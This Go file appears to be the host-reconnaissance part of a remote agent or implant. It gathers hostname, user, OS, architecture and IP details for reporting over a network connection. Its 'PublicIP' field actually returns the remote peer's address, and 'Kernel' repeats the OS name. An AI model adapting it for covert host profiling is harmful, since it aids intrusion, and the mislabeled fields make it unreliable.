package main

import (
	"net"
	"os"
	"runtime"
)

func gatherRecon(conn net.Conn) Recon {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	return Recon{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Kernel:   runtime.GOOS,
		IP:       getLocalIP(),
		PublicIP: getPublicIP(conn),
	}
}

func getPublicIP(conn net.Conn) string {
	tcpAddr := conn.RemoteAddr().(*net.TCPAddr)
	return tcpAddr.IP.String()
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}
